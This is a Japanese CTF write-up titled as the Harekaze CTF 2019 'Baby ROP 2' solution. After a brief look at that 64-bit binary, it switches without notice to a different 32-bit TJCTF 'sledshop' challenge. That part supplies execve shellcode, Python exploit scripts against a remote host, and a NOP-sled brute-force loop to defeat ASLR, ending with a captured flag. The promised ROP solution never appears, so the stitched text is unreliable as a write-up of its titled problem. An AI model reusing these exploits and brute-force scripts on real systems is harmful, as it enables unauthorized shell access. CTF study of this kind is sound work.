# Harekaze CTF 2019 `Baby ROP 2 [pwn 200]` writeup

## 問題

![問題](./001.png)

バイナリがソースコード付きで配布されていて、サーバでそのバイナリのサービスが公開されている。
libcもくっついているのがBaby ROPとの違い。

Harekaze CTF終了した2時間後に解けた。
GOTを追う場所を間違えた。
無念．．．
`printf("%s")`でアドレスリークができると言うのを実践できたのは収穫。

## 解法

### 簡単な調査

まずはバイナリをチェック。
libc使ったROPかな。

```bash-statement
$ sarucheck babyrop2
o: Partial RELRO
o: No Canary found
x: NX enabled
o: No PIE
x: No RPATH
x: No RUNPATH
$
```

64bit。
最近はもう64bitしか出ないのかなぁ。

```bash-statement
$ file ./babyrop2
./babyrop2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=fab931b976ae2ff40aa1f5d1926518a0a31a8fd7, not stripped
$
```

ghidoraでソースコードを見るとBaby ROPとほぼ同じだけどバッファサイズとread使ってる点が異なる。read使ってるってことはNULLでも読んでくれるのでROPが組みやすくなる。
```C
undefined8 main(void)
{
  ssize_t sVar1;
  undefined local_28 [28];
  int local_c;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  printf("What\'s your name? ");
  sVar1 = read(0,local_28,0x100);
  local_c = (int)sVar1;
  local_28[(long)(local_c + -1)] = 0;
  printf("Welcome to the Pwn World again, %s!\n",local_28);
  return 0;
}
```

手元で起動すると`"A" * 40`でsegmentation faultを起こせる。
mainのアドレスが0x40063aだったので入れてみると2回同じメッセージが表示されたので簡単にEIPの奪取は成功。


```bash-statement
import sys
import pwn

s = b"A" * 40
s += pwn.p64(0x40063a)

sys.stdout.buffer.write(s)
```

```
$ cat exploit_01.txt | ./babyrop2
What's your name? Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAA0!
What's your name? Bus error (core dumped)
saru@lucifen:~/wani-writeup/2019/05-harekaze/pwn-baby-rop-2$
```

### ROPを組む

EIP取れたけれどNXがenableなのでROPを組むことを考える。
戦略はlibcがついてるのでのlibc内のexecve関数と文字列`/bin/sh`を使ってシェルを起動するという手順。
ASLRあるんだろうなーと思いつつ、手元でまずは動作確認。
gdb内でシェルが起動することは確認。

```python
b"\x68\x2f\x6c\x73\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"
```

```python: make_string002.py
import sys

shellcode_ls = b"\x68\x2f\x6c\x73\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"

sys.stdout.buffer.write(b"A" * 20 + shellcode_ls + b"B" * 35 + b"\x30\xd4\xff\xff\n")


```

```bash-statement
$ python make_string002.py > exploit002.txt
```

```bash-statement
gef➤ run < exploit002.txt
Starting program: /home/saru/wani-writeup/2019/04-tjctf/bin-silly-sledshop/sledshop < exploit002.txt
The following products are available:
|  Saucer  | $1 |
| Kicksled | $2 |
| Airboard | $3 |
| Toboggan | $4 |
Which product would you like?
Sorry, we are closed.
process 29638 is executing new program: /bin/ls
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
a.out
attack.sh
exploit001.txt
[Inferior 1 (process 29638) exited normally]
gef➤  
```

### ASLRとの戦い

まずは動いたコードを使ってexploit「`solve001.py`」を書いてみたけどまぁこれは予想通りシェルは取れない。
gdb上での実行と実際の実行では環境変数などへの影響でスタックに積まれているデータが変わってアドレスも変わってしまうことを知っていたのでこれはまぁそうかなと納得。

```python:solve001.py
import socket
import telnetlib
import sys
import struct

def read_until(sock, s):
    line = b""
    while line.find(s) < 0:
        line += sock.recv(1)
    return line


host = "p1.tjctf.org"
port = 8010

target_addr = int(0xffffd430)
print("%x" % (target_addr))
target_addr = struct.pack("<L", target_addr)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
print(host)
print(port)
sock.connect((host, port))

ret = read_until(sock, b"Which product would you like?\n")
print(ret)

shellcode_sh = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"

sock.sendall(b"A" * 20 + shellcode_sh + b"B" * 35 + b"\x30\xd4\xff\xff\n")

t = telnetlib.Telnet()
t.sock = sock
t.interact()
```

```bash-statement
$ python solve001.py
ffffd430
p1.tjctf.org
8010
b'The following products are available:\n|  Saucer  | $1 |\n| Kicksled | $2 |\n| Airboard | $3 |\n| Toboggan | $4 |\nWhich product would you like?\n'
Sorry, we are closed.
timeout: the monitored command dumped core
*** Connection closed by remote host ***
$
```


公開されているソースコードでアドレスの位置を出力するコードを追加してコンパイル。
ローカルで実行すると`product_name`の先頭は`0xffffd48c`であることが分かる。

```
void shop_order() {
    int canary = 0;
    char product_name[64];
    printf("%p\n", product_name);

    printf("Which product would you like?\n");
    gets(product_name);

    if (canary)
        printf("Sorry, we are closed.\n");
    else
        printf("Sorry, we don't currently have the product %s in stock. Try again later!\n", product_name);
}
```

```
$ gcc -m32 -z execstack -no-pie -fno-stack-protector sledshop.c -o test_sledshop
 ```

```
$ ./test_sledshop
The following products are available:
|  Saucer  | $1 |
| Kicksled | $2 |
| Airboard | $3 |
| Toboggan | $4 |
0xffffd48c
Which product would you like?
^C
$
```

socatでサーバ化して繋ぐと`0xffffd3fc`となる。
シェルコードの位置はここから+20なのでシェルコードの位置は`0xffffd410`となる。

```bash-statement
socat tcp-listen:10000,reuseaddr,fork system:'./test_sledshop'
```

```bash-statement
$ nc localhost 10000
The following products are available:
|  Saucer  | $1 |
| Kicksled | $2 |
| Airboard | $3 |
| Toboggan | $4 |
0xffffd3fc
Which product would you like?
^C
$
```

とりあえずsocatで立てたローカルサーバでシェルを取れるようにsolve002.pyを書いてみた。
ローカルだとシェルの起動成功！

```python:solve002.py
import socket
import telnetlib
import sys
import struct

def read_until(sock, s):
    line = b""
    while line.find(s) < 0:
        line += sock.recv(1)
    return line


host = "localhost"
port = 10000

target_addr = int(0xffffd410)
print("%x" % (target_addr))
target_addr = struct.pack("<L", target_addr)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
print(host)
print(port)
sock.connect((host, port))

ret = read_until(sock, b"Which product would you like?\n")
print(ret)

shellcode_sh = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"

sock.sendall(b"A" * 20 + shellcode_sh + b"B" * 35 + target_addr)

t = telnetlib.Telnet()
t.sock = sock
t.interact()
```


```bash-statement
$ python solve002.py
ffffd410
localhost
10000
b'The following products are available:\n|  Saucer  | $1 |\n| Kicksled | $2 |\n| Airboard | $3 |\n| Toboggan | $4 |\n0xffffd3fc\nWhich product would you like?\n'
ls
Sorry, we are closed.
ls
attack.sh
attack_local.sh
exploit001.txt
id
uid=1002(saru) gid=1002(saru) groups=1002(saru),27(sudo),33(www-data)
exit
*** Connection closed by remote host ***

```

そしてこれをそのままリモートに。
動かない．．．
考えられる理由は1つしかない。
ASLRが有効．．．
高校生の大会じゃないのかよ．．．
難しすぎだろ．．．

NOP sledを使ったbruteforceをやるしかない。
記事では知っていたけど、まだ実装はしたことない。

まずはASLRを有効にしてスタックのアドレスの範囲の当たりを付ける。
先ほど作った`./test_sledshop`を何度か実行してアドレスを吐かせる。
どうやら`0xff800000`～`0xffffffff`の中のようだ。



```
$ sudo sysctl -w kernel.randomize_va_space=2
kernel.randomize_va_space = 2
$
```

ん．．．ということは8388607の範囲。
広すぎるだろ．．．
1000 sledさせても8000回...

いや、きっと10000 sledぐらい行けるに違いない。

と思ったのだけどgetsがsegmentation fault起こすので最大でも1000ぐらいしか行けない。

時間かけるかと考え直して1000スレッドさせるsolve003.pyと1000ずつincrementするattack.shを書いた。

```python:solve003.py
import socket
import telnetlib
import sys
import struct

def read_until(sock, s):
    line = b""
    while line.find(s) < 0:
        line += sock.recv(1)


host = "p1.tjctf.org"
port = 8010

target_addr = int(sys.argv[1])
print("%x" % (target_addr))

target_addr = struct.pack("<L", target_addr)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
print(host)
print(port)
sock.connect((host, port))

read_until(sock, b"Which product would you like?\n")

shellcode_sh = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"

sock.sendall(b"A" * 80 + target_addr + b"\x90" * 1000 + shellcode_sh + b"C" * 10 + b"\n")

t = telnetlib.Telnet()
t.sock = sock
t.interact()
```

```bash:attack.sh
count=4286578688
while true
do
  echo python solve003.py $count
  python solve003.py $count
  count=`expr $count + 1000`
  if [ $count -gt  4294967295 ]; then
          exit 0
  fi
done
```

```bash-statement
$ bash attack.sh
python solve003.py 4286578688
ff800000
p1.tjctf.org
8010
Sorry, we are closed.
timeout: the monitored command dumped core
*** Connection closed by remote host ***
python solve003.py 4286579688
ff8003e8
p1.tjctf.org
8010
Sorry, we are closed.
timeout: the monitored command dumped core
*** Connection closed by remote host ***
python solve003.py 4286580688
ff8007d0
p1.tjctf.org
8010
Sorry, we are closed.
timeout: the monitored command dumped core
*** Connection closed by remote host ***
python solve003.py 4286581688
ff800bb8
p1.tjctf.org
8010
Sorry, we are closed.
timeout: the monitored command dumped core
*** Connection closed by remote host ***
```

長い．．．
3時間ぐらいかかってようやくflagゲット。
バグがあるんじゃないかとドキドキしながらまっていたので心臓に悪い問題だった。

```bash-statement
python solve003.py 4291613264
ffccd250
p1.tjctf.org
8010
Sorry, we are closed.
ls
flag.txt
sledshop
wrapper
cat flag.txt
tjctf{5l3dd1n6_0mk4r_15_h4ppy_0mk4r}
```


## 参考

- [ブルートフォースによる32bit ASLR回避 - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/03/15/073837)

	
